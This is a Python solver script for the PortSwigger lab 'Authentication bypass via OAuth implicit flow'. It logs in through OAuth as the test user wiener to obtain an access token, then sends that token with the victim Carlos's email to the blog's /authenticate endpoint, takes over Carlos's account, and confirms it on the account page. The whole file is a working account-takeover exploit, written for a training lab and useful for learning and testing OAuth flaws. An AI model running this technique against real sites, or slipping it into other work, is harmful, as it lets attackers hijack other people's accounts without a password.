#!/usr/bin/env python3
"""
Solve the PortSwigger lab "Authentication bypass via OAuth implicit flow".

The blog logs users in via OAuth (implicit flow). After the OAuth provider
authenticates you, your browser sends your profile (email, username) plus the
access token to the blog's own /authenticate endpoint to establish a session.
The flaw: /authenticate checks the token is valid but never checks the email
belongs to that token. So we run the OAuth flow as wiener to get a valid
token, then call /authenticate with CARLOS's email — logged in as Carlos, no
password needed.

Lab: https://portswigger.net/web-security/oauth/lab-oauth-authentication-bypass-via-oauth-implicit-flow
Usage: python3 solve.py https://YOUR-LAB-ID.web-security-academy.net
"""

import re
import sys
import argparse
import requests
from urllib.parse import urljoin, urlparse, parse_qs

# Verify TLS against the OS trust store (works on networks that inspect HTTPS).
import truststore
truststore.inject_into_ssl()

session = requests.Session()
LAB_URL = None  # set from the CLI arg in main()
REQUEST_TIMEOUT = 10

USERNAME = "wiener"
PASSWORD = "peter"
VICTIM_EMAIL = "carlos@carlos-montoya.net"


def fetch(path, method="GET", data=None, json=None, allow_redirects=True):
    """Send a request to the blog (client) and return the response."""
    url = LAB_URL.rstrip("/") + "/" + path.lstrip("/")
    return session.request(method, url, data=data, json=json,
                           timeout=REQUEST_TIMEOUT, allow_redirects=allow_redirects)


def report(name, found, detail=""):
    """Print a finding in a consistent [FOUND] / [clean] format."""
    tag = "FOUND" if found else "clean"
    print(f"[{tag}] {name}: {detail}")


def oauth_get_token():
    """Run the OAuth implicit flow as wiener and return the access token."""
    # 1. Start at the blog — it redirects (via meta refresh) to the OAuth
    #    server's /auth endpoint. Pull that URL out.
    resp = fetch("social-login")
    auth_match = re.search(r"url=(https://[^'\"]+/auth\?[^'\"]+)", resp.text)
    if not auth_match:
        return None
    auth_url = auth_match.group(1)

    # 2. Hit /auth on the OAuth server -> the provider login page. Grab the
    #    action of the login form.
    resp = session.get(auth_url, timeout=REQUEST_TIMEOUT)
    login_match = re.search(r'<form[^>]+action="([^"]+)"', resp.text)
    if not login_match:
        return None
    login_action = login_match.group(1)

    # 3. Log in to the provider as wiener. (Field names username/password match
    #    this OAuth server; a different provider's form may name them otherwise.)
    resp = session.post(urljoin(resp.url, login_action),
                        data={"username": USERNAME, "password": PASSWORD},
                        timeout=REQUEST_TIMEOUT)

    # 4. Grant consent if a consent form appears (action of the consent form).
    confirm_match = re.search(r'<form[^>]+action="([^"]+)"', resp.text)
    if confirm_match:
        resp = session.post(urljoin(resp.url, confirm_match.group(1)),
                            allow_redirects=False, timeout=REQUEST_TIMEOUT)

    # 5. Follow redirects one at a time until the token shows up in a fragment
    #    (implicit flow returns it as #access_token=..., which requests would
    #    otherwise drop when auto-following).
    for _ in range(10):
        if not resp.is_redirect:
            break
        location = resp.headers["Location"]
        if "access_token=" in location:
            return parse_qs(urlparse(location).fragment)["access_token"][0]
        resp = session.get(urljoin(resp.url, location),
                           allow_redirects=False, timeout=REQUEST_TIMEOUT)
    return None


def check_oauth_bypass():
    print(f"[*] Step 1: running the OAuth flow as {USERNAME} to get a valid token...")
    token = oauth_get_token()
    if not token:
        report("OAuth bypass", False, "couldn't obtain an access token")
        return
    print(f"    got a valid token: {token[:16]}...")

    # THE EXPLOIT: reuse our valid token, but claim to be the victim.
    print("[*] Step 2: the /authenticate endpoint checks the token but NOT the email,")
    print(f"    so we send our valid token with the victim's email ({VICTIM_EMAIL})...")
    fetch("authenticate", method="POST",
          json={"email": VICTIM_EMAIL, "username": USERNAME, "token": token})

    # Confirm the hijack — is the account page now Carlos's?
    print("[*] Step 3: checking whose account we're now logged into...")
    resp = fetch("my-account")
    if VICTIM_EMAIL in resp.text or "carlos" in resp.text.lower():
        report("OAuth bypass", True, f"logged in as Carlos ({VICTIM_EMAIL}) with our own token")
    else:
        report("OAuth bypass", False, "authenticate didn't hijack the account")


def parse_args():
    parser = argparse.ArgumentParser(
        description="Hijack an account via an OAuth implicit-flow auth bypass (PortSwigger lab)."
    )
    parser.add_argument(
        "url",
        help="Base URL of your lab instance, e.g. https://XXXX.web-security-academy.net",
    )
    return parser.parse_args()


def main():
    global LAB_URL
    args = parse_args()
    LAB_URL = args.url

    try:
        check_oauth_bypass()
    except requests.exceptions.RequestException as e:
        print(f"[!] Request failed: {e}")
        sys.exit(1)


if __name__ == "__main__":
    main()